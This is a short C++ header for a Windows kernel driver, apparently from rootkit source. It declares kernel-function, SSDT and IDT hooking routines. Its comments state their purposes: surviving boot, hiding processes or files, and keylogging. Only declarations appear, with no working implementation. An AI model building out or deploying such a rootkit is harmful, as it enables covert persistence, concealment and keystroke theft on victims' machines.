#pragma once
#include "requests.h"

namespace roothook {
	bool KernelFunctionHook(void* func_address, const char* module_name, const char* hookto_name);  // Call the kernel function that will hook to another function (func_address = address of MY function)
	NTSTATUS SystemServiceDTHook();  // Perform an SSDT hook for the driver to survive boot / to hide processes or files
	NTSTATUS InterruptDTHook();  // Perform an IDT hook for driver communication / keylogger
	NTSTATUS HookHandler(PVOID hookedf_params);  // Handles the hooking to another kernel function of the wanted external function
}